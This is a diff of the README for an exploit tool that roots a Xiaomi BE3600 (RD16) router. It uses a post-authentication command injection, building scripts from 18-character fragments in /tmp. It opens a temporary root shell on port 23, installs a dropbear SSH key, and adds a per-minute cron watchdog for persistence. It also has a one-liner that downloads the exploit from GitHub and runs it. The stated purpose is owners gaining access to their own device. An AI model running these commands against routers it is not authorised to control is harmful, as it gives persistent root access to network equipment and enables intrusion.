@@ -24,15 +24,15 @@ POST api/xqsmarthome/request_smartcontroller
 scene_start ──► injected command runs as root (≤18 chars each)
     │
     ▼
-fragment writer (echo -n F>/tmp/N + cat /tmp/?>x + sh x)
-    │   works around the 18-char and charset limits
+append-fragment writer (echo -n FF>>/tmp/x + cat /tmp/0>>/tmp/x)
+    │   every injected command <=18 chars, no length cap
     ▼
 inetd.conf + /usr/sbin/inetd ──► :23 temporary root /bin/sh (debug only)
     │
     ▼
 /data + /etc/crontabs (sec_cfg) ──► per-minute self-heal watchdog
 dropbear -s + authorized_keys ──► :22 SSH (key auth only)
-persist verifies :22, then ──► removes inetd and the debug shell
+persist verifies a real SSH login ──► removes inetd + the debug shell
 ```
 
 - **Post-auth RCE**: the admin password is required to reach the injection endpoint; this is not an unauthenticated RCE
@@ -65,9 +65,11 @@ Windows PowerShell (replace `python` with `py` if needed):
 irm -OutFile $env:TEMP\rd16.py https://raw.githubusercontent.com/ChiphaLo/xiaomi-be3600-rd16-ssh/main/exploit.py; python $env:TEMP\rd16.py --ip 192.168.31.1 --password 'YOUR_ADMIN_PASSWORD' --stage persist --pubkey 'ssh-rsa AAAA...your public key'
 ```
 
-- `--stage persist` does everything: injection → temporary inetd (:23) → install key + dropbear (:22, `-s` key-only) → verify SSH answers → remove inetd → `/data` + cron watchdog
+- `--stage persist` does everything: injection → temporary inetd (:23) → install key + dropbear (:22, `-s` key-only) → **verify a real SSH login** → remove inetd → `/data` + cron watchdog
 - `--pubkey` is **required**: SSH accepts keys only; password auth is off (no `-B` blank-password flag)
-- optional `--allow-cidr 192.168.31.0/24` adds iptables rules restricting :22 to that subnet
+- optional `--privkey <path>` runs a real `ssh` login check before removing :23; without it you confirm manually
+- optional `--allow-cidr 192.168.31.0/24` restricts :22 via a dedicated `RD16_SSH` chain (jump rule pinned to the top of INPUT)
+- omit `--password` for an interactive prompt so the password stays out of shell history and the process list
 - debug shell only: swap `--stage persist` for `--stage shell`, then `nc 192.168.31.1 23` (gone after reboot, nothing persisted)
 
 ## Quick start (exploit.py)
@@ -85,19 +87,23 @@ python3 exploit.py --ip 192.168.31.1 --password 'YOUR_ADMIN_PASSWORD' --stage pe
 
 Stdlib only; performs login → injection → inetd → optional persistence.
 
-## Fragment-write technique
+## Append-fragment technique
 
-18 chars can't hold a real command, so script content is emitted ≤3 bytes at a time:
+Every injected command is ≤18 chars and appends directly to the target file — no length cap, and no assembly step that could itself overflow the bound:
 
 ```sh
-echo -n nvr>/tmp/0     # file /tmp/0 = "nvr"
-echo -n am >/tmp/1     # arg splitting yields a real space -> "am "
-echo -n 2 >/tmp/2      # digit-ending frag needs ' >' or it's an fd redirect
-cat /tmp/?>/tmp/x      # reassemble in glob order
+rm -f /tmp/x
+echo -n FF>>/tmp/x    # non-space frags (<=2 chars) append directly
+echo -n A B>/tmp/0    # a space inside a 3-char group -> scratch file
+cat /tmp/0>>/tmp/x    #   then append (the space comes from argv splitting)
+echo -n D >>/tmp/x    # all-digit frags need ' >>' or 'D>>' is an fd redirect
+echo A D >>/tmp/x     # line-final frags use plain echo for the newline
 sh /tmp/x
 ```
 
-Single-char names `0-9a-z` give 36 slots; past that, exploit.py flushes each batch into two-char accumulators (`/tmp/x0`, `/tmp/x1`, …) and assembles them all at the end — manually, `cat /tmp/?>/tmp/xx` moves to a 2-char name and continues.
+- no single-char namespace limit: `/tmp/0` is reused, one output file receives everything
+- `space+digit` mid-line has no legal emission — the writer rejects it explicitly; `>` cannot appear inside content
+- `run_cmd()` hard-checks every injected command for length and banned characters
 
 ## Full manual walkthrough
 
@@ -149,19 +155,21 @@ tar -xzf sl.tar.gz -C sl && head sl/tmp/messages
 
 The tarball also carries `stat/system-02-ps.txt`, `stat/hardware-01-bdata.txt`, `stat/firewall-01-iptable.txt` — live process/nvram/iptables dumps.
 
-### 4. Long scripts via fragments
+### 4. Long scripts via append fragments
 
-Each scene action only fits `echo -n F>/tmp/N` — slice the script:
+Each scene action only fits ≤18 chars — slice the script and **append** piece by piece:
 
 ```sh
-rm -f /tmp/?                          # clear single-char files
-echo -n nvr>/tmp/0; echo -n am >/tmp/1
-echo -n 2 >/tmp/2                     # digit-ending needs ' >'
-cat /tmp/?>/tmp/x                     # reassemble
-sh /tmp/x
+rm -f /tmp/x                            # start clean
+echo -n cp>>/tmp/x                      # <=2-char frags append directly
+echo -n A B>/tmp/0                      # 3-char group with a space -> scratch
+cat /tmp/0>>/tmp/x                      #   then append
+echo -n D >>/tmp/x                      # all-digit frags must use ' >>'
+sh /tmp/x                               # run
 ```
 
-Single-char names `0-9a-z` (36 slots); `cat /tmp/?>/tmp/xx` moves to a 2-char name for longer scripts.
+Space frags: `echo -n A B>/tmp/0` yields `"A B"` (A and B each a single non-digit char), then `cat /tmp/0>>/tmp/x`.
+Every injected command stays ≤18 chars — script length is unbounded.
 
 ### 5. Temporary shell via inetd (debug only)
 
@@ -180,8 +188,9 @@ inetd
 ```sh
 rm /etc/dropbear/dropbear_rsa_host_key       # 0-byte placeholder must go first
 dropbearkey -t rsa -f /data/dropbear_rsa_host_key   # ~1 min, lands on /data (persistent)
+echo 'your ssh-rsa pubkey' > /data/authorized_keys   # land on /data (persistent)
 mkdir -p /etc/dropbear
-echo 'your ssh-rsa pubkey' > /etc/dropbear/authorized_keys
+cp /data/authorized_keys /etc/dropbear/authorized_keys
 /usr/sbin/dropbear -s -r /data/dropbear_rsa_host_key   # -s disables password auth
 ```
 
@@ -205,19 +214,21 @@ Append to `/etc/crontabs/root` (persistent via sec_cfg):
 * * * * * sh /data/persist.sh >/dev/null 2>&1
 ```
 
-Finishing steps:
+Finishing steps — first confirm a real login (`ssh -i <privkey> root@<ip> id` returns `uid=0`); only **after that succeeds** close the debug shell (a banner alone proves nothing):
 
 ```sh
-# confirm :22 is listening (netstat -lnt), then close the debug shell
 for p in $(pgrep -x inetd); do kill $p; done
 rm -f /etc/inetd.conf
 ```
 
-Optional: restrict SSH to the management subnet (fold into persist.sh so it self-heals):
+Optional: restrict SSH to the management subnet (dedicated chain + top-pinned jump rule, immune to earlier generic ACCEPTs; fold into persist.sh so it self-heals):
 
 ```sh
-iptables -I INPUT -p tcp -s 192.168.31.0/24 --dport 22 -j ACCEPT
-iptables -A INPUT -p tcp --dport 22 -j DROP
+iptables -N RD16_SSH 2>/dev/null
+iptables -F RD16_SSH
+iptables -A RD16_SSH -s 192.168.31.0/24 -j ACCEPT
+iptables -A RD16_SSH -j DROP
+iptables -I INPUT -p tcp --dport 22 -j RD16_SSH
 ```
 
 After reboot, dropbear returns within ~1 minute — inetd does not.
@@ -225,6 +236,7 @@ After reboot, dropbear returns within ~1 minute — inetd does not.
 ## Files
 
 - `exploit.py` — single-file tool (stdlib only): login → inject → inetd → optional persistence
+- `tests/test_exploit.py` — offline unit tests (stdlib only): writer replay, length/charset guards, input validation
 - `docs/TECHNICAL_EN.md` — injection-point disassembly, limit derivation, fd-redirect pitfall, alternate channels
 - `docs/TECHNICAL.md` — 中文技术细节
 - `README.md` — 中文说明
